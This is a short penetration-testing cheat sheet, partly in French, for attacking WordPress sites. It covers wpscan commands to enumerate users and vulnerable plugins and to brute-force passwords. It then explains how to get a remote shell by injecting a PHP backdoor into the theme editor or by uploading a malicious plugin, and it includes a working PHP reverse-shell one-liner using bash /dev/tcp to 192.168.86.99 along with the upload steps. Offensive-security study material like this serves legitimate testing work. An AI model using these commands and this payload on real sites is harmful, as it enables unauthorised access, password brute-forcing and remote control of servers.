# Wordpress Enumeration
## Checks
- Look for wordpress version
- Plugins version
- Easy access to the admin panel (Credentials reuse)

## Command
```bash
# Update the scanner
wpscan --update

# Enumerate users
wpscan --url [wordpress url] --enumerate u

# General usage
wpscan --url "url" -e "options to enumerate"

# Look for vulnerable plugins
wpscan --url http://10.10.10.88/webservices/wp/ --enumerate ap --plugins-detection aggressive
   - Voir peut être pour l'option --plugins-version-detection

# Enumeration arguments
–enumerate | -e [option(s)] Enumeration.
option :
u – usernames from id 1 to 10
u [10-20] usernames from id 10 to 20 (you must write [] chars)
p – plugins
vp – only vulnerable plugins
ap – all plugins (can take a long time)
tt – timthumbs
t – themes
vt – only vulnerable themes
at – all themes (can take a long time)

# Brute force user password
wpscan --url [wordpress url] -P [path to wordlist] -U [username to brute force] –threads [number of threads to use]
```

## Getting a reverse shell
- Injecting malicious code inside a WP_Theme
- Upload a malicious WP_Plugin

#### Injecting malicious code inside a WP_Theme (Need to be authenticated)
- Appearance
	- Editor
		- Inject a PHP backdoor (e.g: PentestMonkey)
		- Modify IP and PORT
			- Upload the file
				- Access the file to execute the PHP code


#### Upload a malicious WP_Plugin (Need to be authenticated)
1.Create a reverse shell in PHP
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>
```
2.ZIP the reverse shell
```bash
zip rev.zip reverse.php
```
3.Steps to execute the malicious Plugin
- http://10.10.10.10./wp-admin/plugins.php
	- Add New
		- Upload Plugin
			- Browse
				- Install Now
					- Activate Plugin


## Important file
- wp-config.php